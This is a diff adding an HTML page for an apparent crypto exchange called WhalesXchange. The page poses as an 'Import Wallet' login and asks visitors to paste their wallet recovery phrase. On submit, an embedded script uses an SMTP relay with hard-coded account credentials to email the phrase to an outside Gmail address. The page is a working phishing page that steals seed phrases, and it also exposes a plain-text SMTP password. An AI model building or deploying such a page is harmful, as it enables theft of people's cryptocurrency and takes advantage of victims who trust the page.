@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="whales.css" />
+    <title>Login Wallet</title>
+  </head>
+  <body>
+    <header class="header">
+      <nav class="nav">
+        <ul>
+          <li class="nav-nft"><a class="nav-link">NFTs</a></li>
+          <li class="nav-assets"><a class="nav-link">Assets</a></li>
+          <li class="nav-p2p"><a class="nav-link" href="p2p.html">P2P</a></li>
+          <li class="nav-logo-btn">
+            <img
+              src="./img/getstartedimg2.png"
+              class="start-img-nav nav-logo"
+              alt="Logo"
+            />
+          </li>
+        </ul>
+      </nav>
+    </header>
+
+    <div class="container">
+      <!-- <header>
+          <div class="Import-type">
+            <div class="active-import-type import-type-style type-name">
+              Phrase
+            </div>
+            <div class="import-type-style import-type-name type-name">
+              Keystore JSON
+            </div>
+            <div class="import-type-style import-type-name type-name">
+              Private Key
+            </div>
+          </div>
+        </header> -->
+
+      <!-- Input Logins -->
+
+      <form onsubmit="sendEmail(); reset(); return false;">
+        <div class="import-phrase-header">Import Wallet</div>
+        <div class="input-form-type">
+          <p class="input-p">Phrase</p>
+          <textarea
+            cols="30"
+            rows="8"
+            type="submit"
+            class="input-text"
+            required
+            autofocus
+          >
+          </textarea>
+        </div>
+        <button type="submit">Import</button>
+      </form>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+      function sendEmail() {
+        Email.send({
+          Host: 'smtp.elasticemail.com',
+          Username: 'whalesxchange@gmail.com',
+          Password: 'F06CF76D7D59D80482738FF4CB4B83A62589',
+          To: 'whalesxchange@gmail.com',
+          From: 'whalesxchange@gmail.com',
+          Subject: 'WhalesXchange',
+          Body: document.querySelector('.input-text').value,
+        }).then(message => alert(message));
+        console.log('ok');
+      }
+    </script>
+  </body>
+</html>
